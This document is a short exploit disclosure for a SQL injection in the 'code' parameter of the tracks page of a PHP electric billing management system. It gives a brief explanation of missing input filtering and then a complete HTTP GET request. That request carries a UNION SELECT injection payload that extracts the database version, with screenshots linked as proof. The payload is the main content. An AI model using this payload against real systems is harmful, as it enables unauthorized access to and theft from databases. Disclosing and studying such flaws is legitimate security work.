Exploit Title:  electric-billing-management-system tracks.php SQL-inject

Exploit Author: webraybtl@webray.com.cn inc

Vendor Homepage: https://www.sourcecodester.com/php/14967/electric-billing-management-system-php-and-sqlite-free-source-code.html

Software Link: https://www.sourcecodester.com/php/14967/electric-billing-management-system-php-and-sqlite-free-source-code.html

CMSName: electric-billing-management-system

Tested on: Windows, Apache ,Mysql

Description

The reason for the SQL injection vulnerability is that the website application did not verify the validity of the data submitted by the user to the server (such as type, length, business parameter validity, etc.), nor did it effectively filter the data input by the user with special characters, thus directly inputting the user's input into the database for execution. This exceeded the expected result of the original design of the SQL statement. The system did not filter the code parameter content correctly in the tracks.thp file, resulting in SQL injection

    Payload used:

    GET /electric_billing_0/electric_billing/?page=tracks&code=-1%27%20union%20select%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2Csqlite_version()%3B HTTP/1.1
    Host: 192.168.2.107
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Referer: http://192.168.2.107/electric_billing_0/electric_billing/?page=tracks&code=--1%27%20union%20select%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2Csqlite_version()%3B
    Connection: close
    Cookie: PHPSESSID=g06tfgab6s50lnkbbi55rl10bb
    Upgrade-Insecure-Requests: 1
    Priority: u=0, i

Proof of Concept

![image](https://github.com/user-attachments/assets/70959e4e-6ceb-413d-a7d5-ec42ddf546e4)
![image](https://github.com/user-attachments/assets/740d99dc-364c-4813-b230-fe3f53be4c9b)
![image](https://github.com/user-attachments/assets/bacfb0e3-64cf-4856-8f53-1cce55ab4574)


